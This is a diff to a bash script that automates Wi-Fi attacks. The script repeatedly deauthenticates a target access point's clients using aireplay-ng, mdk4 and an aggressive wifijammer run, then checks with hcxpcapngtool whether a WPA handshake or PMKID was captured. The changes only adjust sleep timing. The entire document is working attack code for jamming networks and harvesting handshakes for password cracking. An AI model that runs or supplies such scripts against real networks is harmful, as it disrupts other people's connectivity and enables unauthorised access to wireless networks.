@@ -95,7 +95,8 @@ echo "aireplay attack ready after time -> $(cat attacktime.txt) !!!"
 echo " "
 xterm -geometry '65x25+0+0' -e 'sleep $(cat attacktime.txt) && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
 
-echo "again aireplay attack ready after time -> 10s, and check handshake !!!" && sleep 11
+echo "again aireplay attack ready after time -> 10s, and check handshake !!!"
+sleep 12
 echo " "
 # ***************** Check Handshake (1) *************************************************
 CHECK1="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -123,9 +124,10 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | tail -1) $(cat interface.txt)'
 echo " "
-echo "mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 11
+echo "mdk4 attack ready after time -> 10s, and check handshake !!!"
+sleep 12
 echo " "
 # ***************** Check Handshake (2) *************************************************
 CHECK2="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -153,9 +155,10 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
-echo "again mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 12
+echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
+sleep 13
 echo " "
 # ***************** Check Handshake (3) *************************************************
 CHECK3="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -183,14 +186,15 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 
 # ----------------FINAL ATTACK METHOD---REVERSE CLIENT SELECTION-->tail intead->head---------------------------------------
 echo " "
 echo "Last chance: FINAL ATTACK METHOD - REVERSE CLIENT SELECTION (tail intead -> head)"
 echo " "
 
-echo "aireplay attack ready after time -> 10s and check handshake !!!" && sleep 15
+echo "aireplay attack ready after time -> 10s and check handshake !!!"
+sleep 16
 echo " "
 # ***************** Check Handshake (4) *************************************************
 CHECK4="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -219,9 +223,10 @@ echo " "
 echo "continues attack process..."
 # ***************************************************************************************
 
-xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
 echo " "
-echo "again aireplay attack ready after time -> 10s, and check handshake !!!" && sleep 12
+echo "again aireplay attack ready after time -> 10s, and check handshake !!!"
+sleep 13
 echo " "
 # ***************** Check Handshake (5) *************************************************
 CHECK5="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -249,9 +254,10 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-xterm -geometry '65x25+0+0' -e 'sleep 1 && aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
+xterm -geometry '65x25+0+0' -e 'aireplay-ng -0 10 -a $(cat macadress.txt) -c $(grep "Client" $(ls -1 hands-$(sed "s/://g" macadress.txt)/$(sed "s/://g" macadress.txt)-0[0-9].log.csv | tail -1) | cut -d "," -f 4 | perl -ne "print if ++\$k{\$_}==1" | head -1) $(cat interface.txt)'
 echo " "
-echo "mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 12
+echo "mdk4 attack ready after time -> 10s, and check handshake !!!"
+sleep 13
 echo " "
 # ***************** Check Handshake (6) *************************************************
 CHECK6="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -279,9 +285,10 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
-echo "again mdk4 attack ready after time -> 10s, and check handshake !!!" && sleep 14
+echo "again mdk4 attack ready after time -> 10s, and check handshake !!!"
+sleep 15
 echo " "
 # ***************** Check Handshake (7) *************************************************
 CHECK7="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -309,9 +316,10 @@ fi
 echo " "
 echo "continues attack process..."
 # ***************************************************************************************
-timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
+timeout 30s xterm -geometry '65x25+0+0' -e 'mdk4 $(cat interface.txt) d -b macadress.txt -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d")'
 echo " "
-echo "wifijammer attack ready after time -> 10s, and check handshake !!!" && sleep 14
+echo "wifijammer attack ready after time -> 10s, and check handshake !!!"
+sleep 15
 echo " "
 # ***************** Check Handshake (8) *************************************************
 CHECK8="$(hcxpcapngtool $(ls -1 hands-$(sed 's/://g' macadress.txt)/$(sed 's/://g' macadress.txt)-0[0-9].cap | tail -1) | sed -n '/EAPOL pairs (best)/p;/PMKID (best)/p' | wc -l | sed 's/[12]/CATCH/g')"
@@ -345,7 +353,7 @@ echo " "
 echo "FINAL wifijammer attack !!!"
 echo " "
 
-timeout 30s xterm -geometry '65x25+0+0' -e 'sleep 1 && python3 /root/wifijammer/wifijammer.py -a $(cat macadress.txt) -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") -i $(cat interface.txt) --aggressive'
+timeout 30s xterm -geometry '65x25+0+0' -e 'python3 /root/wifijammer/wifijammer.py -a $(cat macadress.txt) -c $(grep $(cat macadress.txt) $(ls -1 /root/airlog-0[0-9].csv | tail -1) | cut -d "," -f 4 | sed "s/[ ]//g;1!d") -i $(cat interface.txt) --aggressive'
 
 # Final sleep ---
 sleep 15
